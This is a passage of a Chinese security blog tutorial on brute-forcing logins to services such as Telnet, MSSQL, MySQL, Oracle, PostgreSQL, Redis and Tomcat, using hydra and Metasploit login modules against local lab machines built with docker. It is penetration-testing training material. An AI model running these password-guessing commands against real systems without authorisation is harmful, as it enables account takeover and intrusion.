<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>search telnet_login</pre></td></tr><tr><td data-num="2"></td><td><pre>use <span class="token number">1</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711212500090.png" alt="image-20240711212500090"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711212554331.png" alt="image-20240711212554331"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> USERNAME administrator</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.23.135</pre></td></tr><tr><td data-num="4"></td><td><pre>run</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240711212710139.png" alt="image-20240711212710139"></p>
<h3 id="mssql爆破1433"><a class="anchor" href="#mssql爆破1433">#</a> MSSQL 爆破 (1433)</h3>
<p>Windows Server 2008 R2 部署 SQL Server 2008 R2 环境参考文章：<a target="_blank" rel="noopener" href="https://macchiato.ink/web/web_security/mssql_injection_setup/">https://macchiato.ink/web/web_security/mssql_injection_setup/</a></p>
<p><strong>hydra</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>hydra <span class="token parameter variable">-l</span> sa <span class="token parameter variable">-P</span> /home/kali/password.txt <span class="token number">192.168</span>.23.135 mssql <span class="token number">1443</span> <span class="token parameter variable">-vV</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712150159172.png" alt="image-20240712150159172"></p>
<p><strong>msf</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num="2"></td><td><pre>search mssql_login</pre></td></tr><tr><td data-num="3"></td><td><pre>use <span class="token number">0</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712151740207.png" alt="image-20240712151740207"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712151907261.png" alt="image-20240712151907261"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.23.135</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num="3"></td><td><pre>run</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712152025391.png" alt="image-20240712152025391"></p>
<p><strong>railgun</strong></p>
<p><img loading="lazy" data-src="image-20240712152336113.png" alt="image-20240712152336113"></p>
<h3 id="mysql爆破3306"><a class="anchor" href="#mysql爆破3306">#</a> MySQL 爆破 (3306)</h3>
<p>先检查 mysql 是否开启远程连接</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.23.133 <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span></pre></td></tr></table></figure><p>开启了外连：（密码随便输入）</p>
<p><img loading="lazy" data-src="image-20240712190843829.png" alt="image-20240712190843829"></p>
<p>没开启外连：</p>
<p><img loading="lazy" data-src="image-20240712190414236.png" alt="image-20240712190414236"></p>
<p>MySQL 开启和关闭远程连接参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/patrick-yeh/p/14303729.html">https://www.cnblogs.com/patrick-yeh/p/14303729.html</a></p>
<pre><code class="language-cmd"># 开启mysql远程连接 
mysql -uroot -p
use mysql
# 8.0以下
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
# 8.0以上
# create user root@'%' identified by '设置的密码';
# grant all privileges on *.* to root@'%' with grant option;
FLUSH PRIVILEGES;

# 关闭mysql远程连接
mysql -uroot -p
use mysql;
DELETE FROM user WHERE User=&quot;root&quot; and Host=&quot;%&quot;;
FLUSH PRIVILEGES;

</code></pre>
<p><strong>hydra</strong></p>
<p><img loading="lazy" data-src="image-20240712170350480.png" alt="image-20240712170350480"></p>
<p><strong>railgun</strong></p>
<p><img loading="lazy" data-src="image-20240712170722321.png" alt="image-20240712170722321"></p>
<p><strong>msf</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>search mysql_login</pre></td></tr><tr><td data-num="2"></td><td><pre>use <span class="token number">0</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712171125501.png" alt="image-20240712171125501"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712185116543.png" alt="image-20240712185116543"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.23.133</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num="3"></td><td><pre>run</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712185842203.png" alt="image-20240712185842203"></p>
<h3 id="oracle爆破1521"><a class="anchor" href="#oracle爆破1521">#</a> Oracle 爆破 (1521)</h3>
<p>docker 部署地址：<a target="_blank" rel="noopener" href="https://hub.docker.com/r/oracleinanutshell/oracle-xe-11g">https://hub.docker.com/r/oracleinanutshell/oracle-xe-11g</a></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">docker</span> pull oracleinanutshell/oracle-xe-11g</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># ORACLE_ALLOW_REMOTE=true 开启远程连接</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">-p</span> <span class="token number">1521</span>:1521 <span class="token parameter variable">-e</span> <span class="token assign-left variable">ORACLE_ALLOW_REMOTE</span><span class="token operator">=</span>true oracleinanutshell/oracle-xe-11g</pre></td></tr></table></figure><p><strong>msf</strong></p>
<p>先破解 SID，自带字典就能直接破解</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>search sid_brute</pre></td></tr><tr><td data-num="2"></td><td><pre>use <span class="token number">1</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712213634569.png" alt="image-20240712213634569"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712213848188.png" alt="image-20240712213848188"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.23.129</pre></td></tr><tr><td data-num="2"></td><td><pre>run</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712214257326.png" alt="image-20240712214257326"></p>
<p>然后破解 Oracle 数据库</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>search oracle_login</pre></td></tr><tr><td data-num="2"></td><td><pre>use <span class="token number">1</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712221248349.png" alt="image-20240712221248349"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712221625697.png" alt="image-20240712221625697"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.23.129</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> RPORTS <span class="token number">1521</span></pre></td></tr><tr><td data-num="3"></td><td><pre>run</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712221739705.png" alt="image-20240712221739705"></p>
<p><img loading="lazy" data-src="image-20240712221855746.png" alt="image-20240712221855746"></p>
<h3 id="postgresql爆破5432"><a class="anchor" href="#postgresql爆破5432">#</a> PostgreSQL 爆破 (5432)</h3>
<p>PostgreSQL 一种对象 - 关系数据库</p>
<p>PostgreSQL 官方 docker 镜像：<a target="_blank" rel="noopener" href="https://hub.docker.com/_/postgres">https://hub.docker.com/_/postgres</a></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">docker</span> pull postgres</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 默认用户名：postgres 也可以用 POSTGRES_USER= 设置</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">-p</span> <span class="token number">5432</span>:5432 <span class="token parameter variable">-e</span> <span class="token assign-left variable">POSTGRES_PASSWORD</span><span class="token operator">=</span><span class="token number">123</span>.com postgres</pre></td></tr></table></figure><p><strong>hydra</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>hydra <span class="token parameter variable">-l</span> postgres <span class="token parameter variable">-P</span> password.txt <span class="token number">192.168</span>.23.129 postgres <span class="token parameter variable">-vV</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240713002644405.png" alt="image-20240713002644405"></p>
<p><strong>msf</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>search postgres_login</pre></td></tr><tr><td data-num="2"></td><td><pre>use <span class="token number">0</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712233755711.png" alt="image-20240712233755711"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240712233913075.png" alt="image-20240712233913075"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.23.129</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">set</span> USERNAME postgres</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin class-name">set</span> USER_FILE <span class="token string">""</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">set</span> USERPASS_FILE <span class="token string">""</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">set</span> PASS_FILE /home/kali/password.txt</pre></td></tr><tr><td data-num="6"></td><td><pre>run</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240713000348555.png" alt="image-20240713000348555"></p>
<p><strong>railgun</strong></p>
<p><img loading="lazy" data-src="image-20240713002501476.png" alt="image-20240713002501476"></p>
<h3 id="redis爆破6379"><a class="anchor" href="#redis爆破6379">#</a> Redis 爆破 (6379)</h3>
<p>Redis 环境 docker 地址：<a target="_blank" rel="noopener" href="https://hub.docker.com/r/sqlsec/redis5-centos7-cron">https://hub.docker.com/r/sqlsec/redis5-centos7-cron</a></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 拉取镜像</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">docker</span> pull sqlsec/redis5-centos7-cron:latest</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># 创建容器</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">-p</span> <span class="token number">6379</span>:6379 sqlsec/redis5-centos7-cron:latest</pre></td></tr></table></figure><p>docker 默认没有密码</p>
<p><strong>msf</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num="2"></td><td><pre>search redis_login</pre></td></tr><tr><td data-num="3"></td><td><pre>use <span class="token number">0</span></pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240713180219150.png" alt="image-20240713180219150"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>show options</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240713180254175.png" alt="image-20240713180254175"></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.23.129</pre></td></tr><tr><td data-num="2"></td><td><pre>run</pre></td></tr></table></figure><p><img loading="lazy" data-src="image-20240713180313646.png" alt="image-20240713180313646"></p>
<p>redis 远程连接命令</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.23.129 <span class="token parameter variable">-a</span> 密码</pre></td></tr></table></figure><p>密码配置</p>
<p>在 <code>/etc/redis.config</code>  中插入 <code>requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</code>  配置完需要重启 redis</p>
<p>另一种方式不需要重启 redis</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 首先连接本地 redis</span></pre></td></tr><tr><td data-num="2"></td><td><pre>redis-cli</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># info 显示 redis 信息，如果 info 不显示信息说明需要密码</span></pre></td></tr><tr><td data-num="4"></td><td><pre>info</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># ATUH + 密码 进行认证</span></pre></td></tr><tr><td data-num="6"></td><td><pre>AUTH 密码</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment"># 获取当前密码</span></pre></td></tr><tr><td data-num="8"></td><td><pre>config get requirepass</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment"># 设置密码</span></pre></td></tr><tr><td data-num="10"></td><td><pre>config <span class="token builtin class-name">set</span> requirepass</pre></td></tr></table></figure><h3 id="tomcat爆破8080"><a class="anchor" href="#tomcat爆破8080">#</a> Tomcat 爆破 (8080)</h3>
<p>Tomcat 爆破可以使用 Burp Suite 来进行 Base 认证爆破，也可使用 msf 进行爆破。Tomcat 口令是用户在 <code>/conf/tomcat-users.xml</code>  配置的，容易出现弱口令，容易被 getshell。</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>search tomcat_mgr_login</pre></td></tr><tr><td data-num="2"></td><td><pre>use auxiliary/scanner/http/tomcat_mgr_login</pre></td></tr><tr><td data-num="3"></td><td><pre>show options</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">set</span> RHOTS <span class="token number">192.168</span>.23.129</pre></td></tr><tr><td data-num="5"></td><td><pre>run</pre></td></tr></table></figure><h3 id="mongodb爆破27017"><a class="anchor" href="#mongodb爆破27017">#</a> MongoDB 爆破 (27017)</h3>
<p>一个基于分布式文件存储的数据库，MongoDB 服务开启时不加任何参数，默认是没有开启认证的，存在未授权访问。</p>
<p>可以使用 msf 进行爆破，爆破模块 <code>auxiliary/scanner/mongodb/mongodb_login</code></p>
<div class="tags"><a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"><i class="ic i-tag"></i>Web安全</a><a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="tag"><i class="ic i-tag"></i>暴力破解</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2024-07-17 12:30:51" itemprop="dateModified" datetime="2024-07-17T12:30:51+08:00">2024-07-17</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img loading="lazy" data-src="/assets/wechatpay.png" alt="ph0ven1x 微信支付"><p>微信支付</p></div><div><img loading="lazy" data-src="/assets/alipay.png" alt="ph0ven1x 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ph0ven1x<i class="ic i-at"><em>@</em></i>少即是多，慢即是快</li><li class="link"><strong>本文链接：</strong><a href="https://ph0ven1x.github.io/2024/07/09/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" title="暴力破解">https://ph0ven1x.github.io/2024/07/09/暴力破解/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2024/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="prev" itemprop="url" data-background-image="&#x2F;2024&#x2F;07&#x2F;08&#x2F;%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E&#x2F;upload-gg.jpg" title="文件上传漏洞"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>Web安全</span><h3>文件上传漏洞</h3></a></div><div class="item right"><a href="/2024/08/16/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" rel="next" itemprop="url" data-background-image="&#x2F;2024&#x2F;08&#x2F;16&#x2F;Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;redis_vuln.jpg" title="Redis未授权访问漏洞"><span class="type">下一篇</span><span class="category"><i class="ic i-flag"></i>Web安全</span><h3>Redis未授权访问漏洞</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text"> 爆破破解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.1.</span> <span class="toc-text"> Web 认证爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%88%86%E7%A0%B4"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 基础爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.1.2.</span> <span class="toc-text"> Basic 认证爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6token%E7%88%86%E7%A0%B4"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 带 token 爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A6%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 带图片验证码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-number">1.1.5.</span> <span class="toc-text"> 暴力破解防护措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.</span> <span class="toc-text"> 系统认证爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp-%E7%88%86%E7%A0%B43389"><span class="toc-number">1.2.1.</span> <span class="toc-text"> RDP 爆破 (3389)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E7%88%86%E7%A0%B4445"><span class="toc-number">1.2.2.</span> <span class="toc-text"> SMB 爆破 (445)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%88%86%E7%A0%B422"><span class="toc-number">1.2.3.</span> <span class="toc-text"> SSH 爆破 (22)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#telnet%E7%88%86%E7%A0%B423"><span class="toc-number">1.2.4.</span> <span class="toc-text"> Telnet 爆破 (23)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mssql%E7%88%86%E7%A0%B41433"><span class="toc-number">1.2.5.</span> <span class="toc-text"> MSSQL 爆破 (1433)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E7%88%86%E7%A0%B43306"><span class="toc-number">1.2.6.</span> <span class="toc-text"> MySQL 爆破 (3306)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oracle%E7%88%86%E7%A0%B41521"><span class="toc-number">1.2.7.</span> <span class="toc-text"> Oracle 爆破 (1521)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postgresql%E7%88%86%E7%A0%B45432"><span class="toc-number">1.2.8.</span> <span class="toc-text"> PostgreSQL 爆破 (5432)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E7%88%86%E7%A0%B46379"><span class="toc-number">1.2.9.</span> <span class="toc-text"> Redis 爆破 (6379)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tomcat%E7%88%86%E7%A0%B48080"><span class="toc-number">1.2.10.</span> <span class="toc-text"> Tomcat 爆破 (8080)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mongodb%E7%88%86%E7%A0%B427017"><span class="toc-number">1.2.11.</span> <span class="toc-text"> MongoDB 爆破 (27017)</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2024/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="文件上传漏洞">文件上传漏洞</a></li><li class="active"><a href="/2024/07/09/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" rel="bookmark" title="暴力破解">暴力破解</a></li><li><a href="/2024/08/16/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="Redis未授权访问漏洞">Redis未授权访问漏洞</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ph0ven1x" src="/assets/avatar.jpg"><p class="name" itemprop="name">ph0ven1x</p><div class="description" itemprop="description">热爱技术，热爱生活</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">7</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">5</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">9</span><span class="name">标签</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ph0ven1x" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ph0ven1x"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2024/08/16/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2024/07/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2024</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ph0ven1x @ ph0ven1x</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">87k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">1:19</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
    ispost: true,
        path: `2024/07/09/暴力破解/`,
        favicon: {
        show: `（●´3｀●）やれやれだぜ`,
        hide: `(´Д｀)大変だ！`
    },
    search: {
        placeholder: "文章搜索",
        empty: "关于 「 ${query} 」，什么也没搜到",
        stats: "${time} ms 内找到 ${hits} 条结果"
    },
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    fancybox: true,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
    quiz: {
        choice: `单选题`,
        multiple: `多选题`,
        true_false: `判断题`,
        essay: `问答题`,
        gap_fill: `填空题`,
        mistake: `错题备注`
    },
    ignores: [
        (uri) => uri.includes('#'),
        (uri) => new RegExp(LOCAL.path + '$').test(uri),
            []
    ]
};
</script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/pace/1.2.4/pace.min.js" async></script><script src="/js/siteInit.js?v=0.4.2" type="module" fetchpriority="high" defer="defer"></script></body></html>